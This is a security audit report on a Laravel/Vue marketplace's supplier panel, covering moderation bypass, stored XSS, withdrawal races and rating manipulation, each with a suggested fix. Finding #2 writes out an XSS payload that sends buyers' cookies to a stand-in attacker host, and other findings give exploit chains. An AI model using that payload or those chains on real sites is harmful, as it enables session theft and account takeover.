# Security & Correctness Audit: Supplier (Seller) Panel

Target: **Account Arena** (Laravel backend + Vue 3 / Pinia frontend)
Domain: Supplier Panel (`/supplier/*` Blade/AdminLTE controllers, `Supplier\*` controllers, `SupplierMiddleware`, supplier earnings/withdrawals/disputes/notifications, supplier product CRUD + moderation, supplier rating).
Auditor pass: adversarial code review of the actual code paths (no code modified).

Findings are ordered by severity. Each is traced through the real code and assigned a confidence level. A summary table and a ruled-out list follow the detailed findings.

Files reviewed in full:
- `backend/app/Http/Controllers/Supplier/{Auth,Dashboard,Product,Order,Discount,Dispute,Withdrawal,Notification}Controller.php`
- `backend/app/Http/Middleware/SupplierMiddleware.php`
- `backend/app/Models/{SupplierEarning,SupplierNotification,WithdrawalRequest,ServiceAccount}.php`, supplier fields/methods on `User.php`
- `backend/app/Console/Commands/RecalculateSupplierRatings.php`
- `backend/app/Http/Controllers/Admin/{SupplierController,WithdrawalRequestController}.php`, `Api/AccountController.php`, `admin/product-moderation/show.blade.php`
- `backend/resources/views/supplier/**` (key blades) + frontend storefront renderers (`AccountDetail.vue`, `ProductCard.vue`)

---

## Summary Table

| # | Severity | Title | Category | Confidence |
|---|---|---|---|---|
| 1 | High | Moderation bypass: editing an approved product never re-triggers moderation | Broken moderation / content-injection | High |
| 2 | High | Stored XSS in supplier product `description` / `additional_description` rendered via `v-html` on storefront | Stored XSS | High |
| 3 | Medium | `additional_description` (and EN/UK translations) are invisible to the moderator — blind approval of un-reviewed HTML | Moderation gap / Stored XSS enabler | High |
| 4 | Medium | Supplier can self-activate (`is_active=true`) a product on edit; only the storefront double-gate (`approved` AND `active`) saves it | Broken access control (defense-in-depth) | High |
| 5 | Medium | Bulk-account `store` path bypasses `getRules()` category-type validation (allows attaching a product to a non-product / service category) | Input validation / data integrity | Medium |
| 6 | Low | Withdrawal double-spend guard ignores `approved` (not-yet-paid) requests; only the final `markAsPaid` balance check is authoritative | Withdrawal accounting (defense-in-depth) | Medium |
| 7 | Low | User-cancelled withdrawal mapped to `rejected`; admin can still `approve` a request after the supplier "cancelled" it (race / status confusion) | Withdrawal state machine | Medium |
| 8 | Low | Rating manipulation: `calculateSupplierRating` counts `success`+`completed` but disputes use only `resolved`; self-bought wash sales inflate rating (newcomer floor = 100%) | Rating integrity | Low |
| 9 | Info | Image-upload endpoints keep original filename in JSON response; stored under predictable public path (no SVG, so no direct XSS) | File upload hygiene | Low |
| 10 | Info | `AuthController::showLoginForm` does not log out an authenticated non-supplier (commented-out logout) | Minor logic | High |

---

### [High] Moderation bypass — editing an approved product is not re-moderated

- **Category:** Broken moderation / post-approval content injection
- **Confidence:** High
- **Location:** `backend/app/Http/Controllers/Supplier/ProductController.php:225-283` (`update()`), contrast with `:66-69` / `:155-158` (`store()` / `storeBulkAccounts()`).

**Description**
On **create**, every supplier product is forced to `moderation_status='pending'` and `is_active=false` (lines 68-69 and 156-157), so it is hidden until an admin approves it. On **update**, the controller never touches `moderation_status`. It validates, optionally appends bulk accounts, sets `is_active` from the request, strips SEO fields, and calls `$product->update($validated)`.

**Code path / why it's a bug**
1. Supplier creates a benign product → `pending`/inactive.
2. Admin approves it (`Admin\ProductModerationController::approve` sets `moderation_status='approved'`, `is_active=true`).
3. Supplier hits `PUT /supplier/products/{product}` and rewrites `title`, `description`, `additional_description` (and EN/UK variants) to arbitrary new content. `update()` does **not** reset `moderation_status` back to `pending`, and the product remains `approved`.
4. The storefront gate (`Api\AccountController` lines 27-34, 87-93, 164-168) only requires `is_active=true AND moderation_status='approved'`. Both still hold, so the **edited, never-reviewed content is live immediately**.

This is the documented gotcha (§4.4 / §13 of the functional spec) but it is a genuine control failure: the platform's entire defense against malicious supplier content is one-time moderation, and edit is an un-gated hole straight through it. It is the enabler for finding #2 (post-approval XSS injection).

**Impact**
Any approved supplier can publish arbitrary content (price changes, misleading descriptions, malicious HTML — see #2) to the storefront with zero review. Bulk-account appends on edit also go live without review.

**Suggested fix**
In `update()`, when a supplier edits any moderated field (or unconditionally for supplier-owned products), reset `moderation_status='pending'` and `is_active=false`, and re-notify admins — mirroring `store()`. Optionally only re-moderate when content fields actually change.

---

### [High] Stored XSS — supplier `description` / `additional_description` rendered with `v-html`

- **Category:** Stored XSS
- **Confidence:** High
- **Location:**
  - Write (no sanitization): `Supplier\ProductController::store()/storeBulkAccounts()/update()` — `description`, `additional_description` (+ `_en`/`_uk`) are validated only as `nullable|string` (`getRules()` `:431-433`) and saved verbatim.
  - API echo: `Api\AccountController::single()`/`similar()` return raw `description`, `additional_description` (e.g. `:210-212` for similar; single returns the same fields).
  - Render (raw HTML): `frontend/src/pages/account/AccountDetail.vue:461` (`v-html="description"`), `:493` (`v-html="additionalDescription"`); `frontend/src/components/products/ProductCard.vue:119` (`v-html="displayDescription"`).

**Description**
Supplier-controlled free-text product fields are stored with no HTML sanitization, returned raw by the public product API, and injected into the DOM via Vue `v-html` on the product-detail page and product cards. A supplier who gets a product approved can place an XSS payload (e.g. `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`) in `description`/`additional_description` and it executes in the browser of **every buyer** who views the product or a card.

**Code path / why it's a bug**
`v-html` performs no escaping. The only barrier between a supplier and the buyer's DOM is admin moderation — and that barrier is (a) bypassable on edit (finding #1), and (b) blind to `additional_description` (finding #3). Chained with #1: submit clean content → get approved → edit in the payload → no re-moderation → live XSS. Even without #1, a supplier can try to sneak a subtle payload past the admin in the `description` field directly.

**Impact**
Stored XSS executing in buyers' (and any admin previewing on the storefront) browsers: session/token theft (the SPA stores its bearer token in `localStorage`, directly readable by injected JS), account takeover, drive-by actions. Storefront-wide blast radius.

**Suggested fix**
Sanitize supplier HTML server-side on write (HTMLPurifier with a strict allow-list) for all supplier-editable rich-text fields; or render these fields with `{{ }}`/text interpolation instead of `v-html`; or both. Do not rely on moderation as the XSS control.

---

### [Medium] Moderator is blind to `additional_description` and EN/UK fields

- **Category:** Moderation gap (Stored-XSS enabler)
- **Confidence:** High
- **Location:** `backend/resources/views/admin/product-moderation/show.blade.php` — only `title` (`:34`), `title_en`/`title_uk` (`:35-39`), and `description` (`:96`, escaped via `{!! nl2br(e($product->description)) !!}`) are shown. There is **no** rendering of `additional_description`, `additional_description_en/uk`, `description_en/uk`.

**Description**
The admin moderation screen displays only the primary `title` and `description`. The supplier also controls `additional_description` (+ `_en`/`_uk`) and `description_en`/`description_uk`, all of which are rendered raw via `v-html` on the storefront (finding #2). Because the moderator never sees these fields, a supplier can place benign text in `description` (the only reviewed field) and the XSS payload / disallowed content in `additional_description`, and it sails through approval.

**Code path / why it's a bug**
Approval (`approve()`) flips the product to `approved` + `is_active=true` based on what the admin saw — but the admin saw a strict subset of supplier-controlled content. The un-reviewed fields go live verbatim.

**Impact**
Defeats moderation as a content control; directly enables the stored XSS in #2 and publication of policy-violating content with no review.

**Suggested fix**
Render **all** supplier-editable content fields (additional descriptions and every translation) on the moderation screen, escaped, so the moderator reviews exactly what will be published.

---

### [Medium] Supplier can self-activate a product on edit (`is_active` taken from request)

- **Category:** Broken access control (defense-in-depth)
- **Confidence:** High
- **Location:** `Supplier\ProductController::update()` `:256` — `$validated['is_active'] = $request->boolean('is_active', false);`

**Description**
On create, `is_active` is force-set to `false` (moderation gating). On update, the supplier's submitted `is_active` is honored. A supplier can therefore set `is_active=true` on their own product at will.

**Code path / why it's a bug**
This is only *not* an immediate storefront exposure because the public API requires **both** `is_active=true` **and** `moderation_status='approved'` (`Api\AccountController`). So a `pending`/`rejected` product set active still stays hidden. However, it removes the platform's ability to deactivate a supplier product via `is_active` alone (the supplier just re-enables it), and it combines with finding #1: for an already-`approved` product the supplier fully controls its live/active state with no oversight. It is a real authorization gap on a moderation-adjacent flag that the create path deliberately locks down.

**Impact**
Supplier controls activation of approved products unilaterally; admin `is_active=false` toggles can be reverted by the supplier. Becomes a live-content lever when paired with #1.

**Suggested fix**
For supplier products, do not accept `is_active` from the request on update (keep admin-controlled), or couple any activation change with re-moderation (`moderation_status='pending'`).

---

### [Medium] Bulk-account store path skips category-type validation

- **Category:** Input validation / data integrity
- **Confidence:** Medium
- **Location:** `Supplier\ProductController::store()` `:34-48` (category-type checks) vs. `storeBulkAccounts()` `:101-163`.

**Description**
The single-product `store()` validates that the chosen `category_id`/`subcategory_id` is `Category::TYPE_PRODUCT` (and a real subcategory) before saving. When `bulk_accounts` is non-empty, `store()` short-circuits to `storeBulkAccounts()` (`:56-58`) which re-validates with a **different, narrower** rule set (`:103-110`) that does **not** include `category_id`/`subcategory_id` rules and never checks the category type. It simply does `$categoryId = $request->input('subcategory_id') ?: $request->input('category_id')` (`:121`) and saves it.

**Code path / why it's a bug**
A supplier using the bulk path can submit an arbitrary `category_id` (e.g. a service category, an article category, or a non-existent id — there isn't even an `exists` check in the bulk rules) and have it persisted on the product. The single path forbids exactly this. Effects depend on how categories are consumed downstream (broken category joins, product surfacing under the wrong/admin-only category, or null/dangling category references).

**Impact**
Data-integrity corruption and potential mis-categorization (e.g. surfacing a product under a category it should not belong to). Lower severity because moderation still gates publication and the field is not money-bearing.

**Suggested fix**
In `storeBulkAccounts()`, run the same `category_id`/`subcategory_id` `exists` + `TYPE_PRODUCT` + subcategory validation as `store()`, or refactor so both paths share one validated category resolution.

---

### [Low] Withdrawal double-spend guard ignores `approved` requests

- **Category:** Withdrawal accounting (defense-in-depth)
- **Confidence:** Medium
- **Location:** `Supplier\WithdrawalController::store()` `:145-152` — subtracts only `status='pending'` requests from available; `Admin\WithdrawalRequestController::approve()` `:101-104` likewise only subtracts other `pending` requests.

**Description**
At request time, `maxAvailable = available − sum(pending requests)`. Requests that an admin has already moved to `approved` (but not yet `paid`) are **not** subtracted. So a supplier with `$100` available and an existing `approved-but-unpaid` `$100` request can still create a new `pending` `$100` request — the guard sees `pending=0`.

**Code path / why it's a bug**
The earnings are not consumed until `markAsPaid` (`decrement('supplier_balance', amount)` + marking earnings `withdrawn`). Between `approve` and `paid`, the funds are "promised" but neither the supplier-side `store` nor the admin `approve` accounts for already-approved requests. The only true backstop is `markAsPaid` (`:185-189`): it re-syncs balance and throws if `supplier_balance < amount`. So an actual over-payout requires the admin to pay both before the balance reconciles — the final check usually prevents real loss, but the guard is genuinely incomplete and relies entirely on the very last step.

**Impact**
Multiple stacked withdrawal requests can be created/approved exceeding available funds; correctness depends solely on the `markAsPaid` balance check firing for each. A defense-in-depth weakness in the payout pipeline.

**Suggested fix**
Subtract both `pending` **and** `approved` (unpaid) request sums when computing `maxAvailable` in `store()` and when validating in `approve()`.

---

### [Low] Cancelled-vs-rejected status confusion; cancel/approve race

- **Category:** Withdrawal state machine
- **Confidence:** Medium
- **Location:** `Supplier\WithdrawalController::cancel()` `:196-223` sets `status='rejected'`; admin `approve()`/`markAsPaid()` key off `pending`/`approved`.

**Description**
A user-cancelled request is stored as `rejected` (no dedicated `cancelled` status). `cancel()` only checks `status==='pending'` and is not wrapped in a row lock/transaction. If an admin `approve()`s the request in the same window, the two updates race: the supplier may believe a request is cancelled while the admin approves/pays it, or vice-versa. Because cancelled and admin-rejected share `rejected`, audit/reporting cannot distinguish a supplier withdrawal from an admin denial.

**Code path / why it's a bug**
No `lockForUpdate` on the `WithdrawalRequest` in `cancel()`, and no re-read of status inside a transaction. The status semantics are also overloaded.

**Impact**
Edge-case state confusion and weakened auditability of payouts. Not a direct fund loss (admin steps still re-check balance), hence Low.

**Suggested fix**
Add a distinct `cancelled` status; perform `cancel()` inside a transaction with `lockForUpdate()` and re-check `status==='pending'` after the lock.

---

### [Low] Rating manipulation via wash sales / lenient sale counting

- **Category:** Rating integrity
- **Confidence:** Low
- **Location:** `User::calculateSupplierRating()` `backend/app/Models/User.php:165-211`.

**Description**
Rating = valid-sales percentage over a 90-day window, where `totalSales` counts transactions with status in `['completed','success']`, and invalid = `refunds + replacements` from **resolved** disputes only. Two manipulation levers:
- **Newcomer floor:** `totalSales < 10` ⇒ rating forced to `100.00`. A supplier can keep producing fresh products / low volume and perpetually sit at 100%.
- **Wash sales:** the supplier (or a colluding account) can self-purchase their own product to inflate `totalSales`. Each clean self-sale raises the denominator of valid sales and dilutes the impact of real refunds, pushing rating toward 100%. Nothing excludes the supplier's own user id (or related accounts) from the sales count.

**Code path / why it's a bug**
Rating gates trust/visibility/level badges and is surfaced to buyers. Counting any `completed/success` transaction (including potential self-purchases) without buyer-distinctness checks lets a supplier game the score.

**Impact**
Inflated trust signals shown to buyers; weakened "risk of blocking" tier. Low confidence because exploitability depends on whether self-purchase of one's own supplier product is permitted by the checkout flow (out of this domain's scope to confirm).

**Suggested fix**
Exclude the supplier's own (and obviously-related) accounts from `totalSales`; consider counting only disputes-eligible/settled sales; revisit the blanket newcomer 100% floor (e.g. show "unrated" instead).

---

### [Info] Image-upload hygiene

- **Category:** File upload
- **Confidence:** Low
- **Location:** `Supplier\ProductController::store/update` (`image` rule, `:434`), `uploadImage()` `:392-416`.

**Description**
Both upload paths validate `image|mimes:jpeg,png,jpg,gif,webp` (no `svg`), so direct SVG-XSS is **not** possible — this is a positive note. Minor hardening observations only: `uploadImage()` echoes the attacker-supplied `getClientOriginalName()` back in JSON (`:406`) and files are stored under predictable public paths (`products/`, `products/descriptions/`) via `store(..., 'public')`. No path traversal (Laravel generates the stored name), and the original name is not used as the stored filename. No actionable vulnerability; listed for completeness.

**Suggested fix**
None required; optionally re-encode/strip metadata from uploaded images and avoid reflecting the raw original filename.

---

### [Info] `showLoginForm` does not log out an authenticated non-supplier

- **Category:** Minor logic
- **Confidence:** High
- **Location:** `Supplier\AuthController::showLoginForm()` `:11-24` — the `auth()->logout()` for a logged-in non-supplier is commented out (`:20`).

**Description**
If a logged-in non-supplier (e.g. a customer) hits `GET /supplier/login`, they are not redirected to the dashboard (correct — they aren't a supplier) and not logged out; the login form just renders. Harmless: `SupplierMiddleware` still blocks all protected supplier routes for non-suppliers (and logs them out there). No access is granted. Noted only because the spec calls it out.

**Suggested fix**
None functionally required.

---

## Ruled Out (checked, found safe)

- **Product edit/update/destroy/export IDOR** — `edit()` `:198`, `update()` `:228`, `destroy()` `:288`, `export()` `:304` and again after lock `:315` all enforce `$product->supplier_id !== auth()->id() ⇒ abort(403)`. Supplier A cannot touch supplier B's products. **Safe.**
- **Product list scoping** — `index()` uses `auth()->user()->supplierProducts()` (own products only). **Safe.**
- **Discount IDOR (store)** — `store()` validates `exists:service_accounts,id` then re-fetches with `->where('supplier_id', auth()->id())->firstOrFail()` (`:43-45`); a foreign `product_id` 404s. **Safe.**
- **Discount IDOR (edit/update/destroy)** — all three check `$discount->supplier_id !== auth()->id() ⇒ abort(403)` (`:60`, `:76`, `:95`). **Safe.**
- **Negative / >100% discount** — `discount_percent` validated `numeric|min:1|max:99` on both store and update. No negative, no ≥100%. **Safe.**
- **Discount mass-assignment** — `update()` mass-assigns `$validated`, which contains only `discount_percent` + the two dates (no price/commission/supplier_id/moderation fields). **Safe.**
- **Product mass-assignment of privileged fields** — `getRules()` whitelists only title/description/translations/price/category/image/bulk/is_active; `supplier_id`, `moderation_status`, `commission`, `used`, `delivery_type`, `accounts_data` (except via the dedicated bulk handler) are **not** in the rules, so they cannot be injected via `$validated`. Create explicitly forces `supplier_id`, `moderation_status='pending'`, `is_active=false`. **Safe** (except the `is_active`-on-update and bulk-category gaps noted above as #4/#5).
- **Price floor** — `price` validated `numeric|min:0.01` on both single and bulk paths; no zero/negative price. **Safe.**
- **Orders IDOR** — `OrderController::index()` filters `whereHas('serviceAccount', supplier_id=me)` + `status='completed'`; the `product_id` filter is an additional `where`, not a scope replacement, so it cannot reveal another supplier's transactions (a foreign id just yields zero rows within the already-scoped query). Read-only. **Safe.**
- **Disputes IDOR** — `index()` uses `ProductDispute::forSupplier(me)` (scope on `supplier_id`); `show()` checks `$dispute->supplier_id !== me ⇒ abort(403)`. Read-only. **Safe.**
- **Notifications IDOR** — `markAsRead()` scopes `where('user_id', auth()->id())->firstOrFail()`; `index()`/`markAllAsRead()`/`getUnreadCount()` go through `auth()->user()->supplierNotifications()`. **Safe.**
- **Withdrawal cancel IDOR** — `cancel()` checks `$withdrawal->supplier_id !== auth()->id() ⇒ abort(403)` and only allows `pending`. **Safe** (status-confusion note is #7, not an IDOR).
- **Withdrawal over-request (single request)** — `store()` runs in a transaction with `lockForUpdate` on the user and on earnings, recomputes available, subtracts pending, and validates `amount ≤ maxAvailable`. The held-vs-available split is enforced (`available_at <= now`). A single request cannot exceed available. **Safe** (the `approved`-not-subtracted nuance is #6).
- **Withdrawal against held funds** — available is computed as `status='available' OR (held AND available_at <= now)`; pure held funds (`available_at > now` / null) are excluded. **Safe.**
- **Withdrawal balance decrement** — only at admin `markAsPaid` with `lockForUpdate`, balance sync, and a `supplier_balance < amount ⇒ throw` guard; earnings marked `withdrawn` FIFO. Reversal (`SupplierEarning::reverse/partialReverse`) refuses to reverse `withdrawn`/already-`reversed` rows. **Safe.**
- **Payment-details tampering** — `updatePaymentDetails()` validates `trc20_wallet`/`card_number_uah` and updates only the authenticated user's own row; `store()` snapshots the detail string into the request. No cross-user write. **Safe** (free-form string, but bound to self).
- **XSS in supplier Blade views** — no `{!! !!}` anywhere under `resources/views/supplier/**`; all output (`title`, `moderation_comment`, notification `message`, payment details, dispute fields) uses escaped `{{ }}`. **Safe.** (Storefront `v-html` is the real XSS sink — finding #2.)
- **SVG / path-traversal upload** — `mimes` excludes `svg`; Laravel `store()` generates the stored filename (no traversal). **Safe.**
- **SEO/instruction field injection** — `getAllowedFieldsForSupplier()` strips all `meta_*`, `seo_text*`, `instruction*` from supplier writes on every path. **Safe.**
- **Route protection** — every protected supplier route is under `['auth','supplier.auth']`; `SupplierMiddleware` redirects unauthenticated users and logs out non-suppliers. (Admins who are also `is_supplier` can reach endpoints, but standard suppliers are `is_admin=false`; not an external-attacker vector.) **Safe.**
- **Balance sync negative-guard** — `syncSupplierBalance` (dashboard + withdrawal) locks `held` earnings, only releases sum `> 0`, refuses to make balance negative, and is wrapped in try/catch so it never breaks the page. **Safe.**
